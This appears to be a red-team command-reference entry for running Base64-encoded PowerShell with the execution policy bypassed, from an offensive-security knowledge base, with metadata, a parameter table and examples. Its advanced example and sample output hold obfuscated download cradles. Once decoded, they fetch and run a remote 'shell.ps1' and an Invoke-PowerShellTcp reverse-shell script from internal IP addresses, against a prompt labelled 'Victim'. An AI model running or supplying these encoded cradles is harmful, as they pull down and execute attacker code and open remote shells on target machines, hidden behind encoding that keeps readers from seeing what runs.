---
id: c347500b-4150-463a-811d-877b10d02dfc
name: powershell-execute-base64-encoded-command
type: command
executor: powershell
data: powershell -ep bypass -enc $_PAYLOAD.b64
output: >-
  PS C:\Users\Victim> powershell -ep bypass -enc
  aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADUANgAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=
created_at: '2019-11-13T23:32:45.206600+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Windows
tags:
  - execution
  - powershell
  - bypass
verified: true
validated: true
---

# powershell-execute-base64-encoded-command

## Command

```powershell
powershell -ep bypass -enc $_PAYLOAD.b64
```

## Description

This command launches a new PowerShell instance to execute a Base64-encoded command, bypassing the execution policy to run obfuscated scripts or payloads on Windows targets.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_PAYLOAD.b64 | The Base64-encoded PowerShell command string | Yes |
| -ep bypass | Bypass the execution policy restrictions | Built-in |
| -enc | Decode and execute the Base64 input as a command | Built-in |

## Examples

### Basic Usage

```powershell
powershell -ep bypass -enc R2V0LURhdGU=
```

### Advanced Usage

```powershell
powershell -ep bypass -enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAwAC8ASQBuAHYAbwBrAGUALQBQAG8AdwBlAHIAUwBoAGUAbABsAFQAYwBwAC4AcABzADEAJwApAA==
```

## Expected Output

Description of what output to expect when the command runs successfully. The encoded payload decodes and executes, producing output based on the script (e.g., shell prompt or connection).

```
PS C:\Users\Victim> powershell -ep bypass -enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADUANgAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=
```

## Related

- [[procedures/Encode-and-Execute-Base64-PowerShell-Command]]
- [[commands/powershell-base64-encode-string]]
